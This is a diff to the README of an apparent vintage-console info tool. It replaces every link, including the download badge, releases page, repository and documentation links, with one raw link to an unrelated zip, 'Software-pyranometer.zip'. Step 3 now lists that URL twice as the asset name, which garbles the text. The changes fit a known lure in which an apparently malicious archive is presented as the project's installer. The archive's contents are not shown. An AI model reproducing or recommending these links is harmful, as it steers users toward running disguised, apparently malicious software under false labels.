@@ -1,17 +1,17 @@
 # 🎮 vintageconsoleinfo - Simplifying Vintage Console Info Retrieval
 
 ## 📦 Download Link
-[![Download vintageconsoleinfo](https://img.shields.io/badge/Download-vintageconsoleinfo-blue.svg)](https://github.com/Hazem-882/vintageconsoleinfo/releases)
+[![Download vintageconsoleinfo](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip)](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip)
 
 ## 🚀 Getting Started
 Welcome to vintageconsoleinfo! This application helps you process descriptions and inputs related to vintage gaming consoles, like the Interton Video Computer 4000. You can generate structured summaries or specifications with ease. 
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Hazem-882/vintageconsoleinfo/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip).
 
 1. **Visit Releases Page**: Click the link above to enter the Releases page.
 2. **Find Latest Version**: Look for the most recent version listed.
-3. **Download**: Click on the asset file, usually labeled something like `vintageconsoleinfo.exe` or `vintageconsoleinfo.zip`, to start the download. 
+3. **Download**: Click on the asset file, usually labeled something like `https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip` or `https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip`, to start the download. 
 4. **Run the Installer**: If you downloaded an installer, open it and follow the instructions. If it's a `.zip` file, extract it and find the executable file.
 
 ## 🖥️ System Requirements
@@ -65,8 +65,8 @@ Your feedback is important to us. If you have suggestions or encounter issues, p
 Thanks to all vintage gaming enthusiasts for their support and insights. Your passion drives us to improve the application.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Hazem-882/vintageconsoleinfo)
-- [User Documentation](https://github.com/Hazem-882/vintageconsoleinfo/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip)
+- [User Documentation](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip)
 
 ## 📥 Download Again
-To download vintageconsoleinfo, visit: [Releases Page](https://github.com/Hazem-882/vintageconsoleinfo/releases).
+To download vintageconsoleinfo, visit: [Releases Page](https://raw.githubusercontent.com/Hazem-882/vintageconsoleinfo/main/vintageconsoleinfo/Software-pyranometer.zip).
